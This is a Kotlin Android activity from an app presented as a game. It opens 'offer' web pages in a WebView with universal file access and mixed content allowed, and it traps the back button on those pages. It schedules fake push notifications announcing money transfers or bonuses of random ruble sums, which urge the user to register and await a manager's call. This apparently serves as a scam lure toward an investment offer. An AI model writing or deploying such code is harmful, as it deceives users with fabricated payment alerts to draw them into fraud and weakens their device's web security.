package com.eqcpert.padlotka

import android.Manifest
import android.content.pm.ActivityInfo
import android.os.Build
import android.os.Bundle
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.addCallback
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isVisible
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.eqcpert.padlotka.databinding.ActivityGameBinding
import com.eqcpert.padlotka.game.utils.runGDX
import com.eqcpert.padlotka.push.NotificationManager
import com.eqcpert.padlotka.push.NotificationWorker
import com.eqcpert.padlotka.push.Push
import com.eqcpert.padlotka.util.OneTime
import com.eqcpert.padlotka.util.log
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit
import kotlin.system.exitProcess

class GameActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private val coroutine = CoroutineScope(Dispatchers.Main)
    private val onceExit  = OneTime()

    private lateinit var binding  : ActivityGameBinding

    var blockBack    : () -> Unit = {}
    var blockRedirect: () -> Unit = {}

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        NotificationManager.createChannel(this)
        registerPermissionNotification()

        initialize()
    }

    override fun exit() {
        onceExit.use {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                finishAffinity()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityGameBinding.inflate(layoutInflater)
        setContentView(binding.root)
    }

    // Init Web ----------------------------------------------------------------------------------

    fun initWeb() {
        coroutine.launch {
            binding.webView.apply {
                settings.apply {
                    allowFileAccessFromFileURLs = true
                    allowContentAccess = true
                    javaScriptEnabled = listOf(true).first()
                    javaScriptCanOpenWindowsAutomatically = true
                    allowFileAccess = true
                    mixedContentMode = 0
                    useWideViewPort = true
                    allowUniversalAccessFromFileURLs = true
                    loadWithOverviewMode = true
                    domStorageEnabled = true
                    databaseEnabled = true
                }

                webViewClient = WebClient()

                // Реєструємо зворотний виклик у диспетчері
                onBackPressedDispatcher.addCallback {
                    if (canGoBack()) {
                        goBack()
                    } else {
                        if (isOffer.not() && isVisible) {
                            hideWebView()
                        } else blockBack()
                    }
                }
            }
        }
    }

    private var isOffer = true


    fun showUrl(url: String, isOffer: Boolean = true) {
        coroutine.launch {
            log("showUrl: $url | isOffer = $isOffer")

            this@GameActivity.isOffer = isOffer
            showWebView()
            requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER

            binding.webView.apply {
                isVisible = true
                loadUrl(url)
            }
            setNavBarColor(R.color.white)
            setStatusBarColor(R.color.black, false)
        }
    }

    private inner class WebClient : WebViewClient() {
        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {
            log("redirect: ${request?.url.toString()}")

            when {
                request?.url.toString().contains("investexpert/expinv") -> {
                    runGDX {
                        log("contains")
                        blockRedirect()
                    }
                }
                request?.url.toString().contains("thanks") -> {
                    showNotificationNow()
                    WorkManager.getInstance(this@GameActivity).cancelAllWork()
                }
                else -> {
                    showNotificationLater()
                }
            }

            return false
        }
    }

    // Logic -----------------------------------------------------------------------------------------

    fun setNavBarColor(colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = getColor(colorId)
        }
    }

    fun setStatusBarColor(colorId: Int, isLight: Boolean = true) {
        coroutine.launch(Dispatchers.Main) {
            window.statusBarColor = getColor(colorId)
            window.decorView.systemUiVisibility = if (isLight) View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR else 0
        }
    }

    fun hideWebView() {
        coroutine.launch {
            binding.navHostFragment.visibility = View.VISIBLE
            binding.webView.visibility         = View.GONE
        }
    }

    private fun showWebView() {
        binding.navHostFragment.visibility = View.GONE
        binding.webView.visibility         = View.VISIBLE
        binding.webView.requestFocus()
    }

    // Push ------------------------------------------------------------------------------------------

    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted: Boolean -> }

    private fun registerPermissionNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    fun showNotificationNow() {
        val suma = ((30..45).random() * 1000) + (100..999).random()
        val push = Push(R.drawable.push_icon, "\uD83D\uDCB3 Вам перевод: $suma₽", "Дождитесь звонка менеджера и получите выплату")

        NotificationManager.run {
            val notification = build(this@GameActivity, push)
            send(this@GameActivity, notification)
        }
    }

    fun showNotificationLater() {
        val suma  = ((30..45).random() * 1000) + (100..999).random()
        val title = "\uD83D\uDCB3Зачисление бонуса: $suma₽"
        val text  = "Заберите выплату после регистрации"

        val data = workDataOf(
            "title" to title,
            "text"  to text,
        )

        val notificationWork = OneTimeWorkRequestBuilder<NotificationWorker>()
            .setInputData(data)
            .setInitialDelay(20, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueueUniqueWork(
            "NotificationWork",
            ExistingWorkPolicy.REPLACE,
            notificationWork
        )
    }

}